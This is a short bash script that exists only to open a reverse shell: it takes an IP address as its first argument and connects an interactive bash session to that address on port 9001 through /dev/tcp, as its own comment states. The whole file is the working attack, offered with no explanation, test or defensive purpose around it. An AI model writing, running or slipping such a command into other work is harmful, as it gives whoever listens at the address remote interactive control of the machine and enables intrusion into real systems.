#!/bin/bash

IP_ADDRESS=$1
# Create a reverse shell connection
bash -i >& /dev/tcp/$IP_ADDRESS/9001 0>&1